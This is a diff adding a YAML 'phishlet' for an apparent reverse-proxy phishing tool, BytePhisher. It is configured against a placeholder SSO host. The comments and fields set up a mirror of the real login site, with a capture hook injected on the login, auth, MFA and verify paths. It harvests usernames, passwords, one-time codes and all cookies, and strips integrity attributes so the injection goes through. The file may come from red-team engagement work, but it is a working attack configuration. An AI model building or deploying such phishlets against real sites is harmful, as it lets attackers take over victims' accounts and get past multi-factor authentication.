@@ -1,0 +1,52 @@
+# BytePhisher phishlet — reverse-proxy target definition.
+#
+# A phishlet tells the proxy which real site to mirror, which paths get the
+# capture hook, and which cookies are worth harvesting. Copy this file per
+# engagement and edit it; nothing here is target-specific by default.
+#
+#   bytephisher.py --proxy --phishlet config/phishlets/example.yaml -t cloudflared
+#
+# Fields:
+#   name             label used in the DB/report for this campaign target
+#   upstream         real host to proxy (HOST or HOST:PORT, no scheme)
+#   scheme           http | https  (https unless the target is plain HTTP)
+#   login_path       path that shows the login form (documentation/telemetry)
+#   capture_fields   field names the hook prioritises (informational)
+#   capture_cookies  cookie names to harvest ("*" = all, or a list)
+#   inject_paths     regexes of paths that receive the hook
+#   block_paths      regexes of paths the hook must never touch
+#   redirect_after   where to send the victim once the flow completes
+#   strip_integrity  drop SRI integrity attributes (required once we inject)
+#   rewrite_hosts    extra hosts whose absolute URLs should point back at us
+#   verify_tls       verify the upstream certificate (leave true in real use)
+
+name: example-sso
+upstream: sso.example.com
+scheme: https
+login_path: /login
+
+capture_fields:
+  - username
+  - password
+  - otp
+
+capture_cookies:
+  - "*"
+
+inject_paths:
+  - "^/login"
+  - "^/auth"
+  - "^/signin"
+  - "^/mfa"
+  - "^/verify"
+
+block_paths:
+  - "^/static/"
+  - "^/assets/"
+  - "\\.(css|js|png|jpg|svg|woff2?)$"
+
+redirect_after: ""
+strip_integrity: true
+rewrite_hosts:
+  - sso.example.com
+verify_tls: true
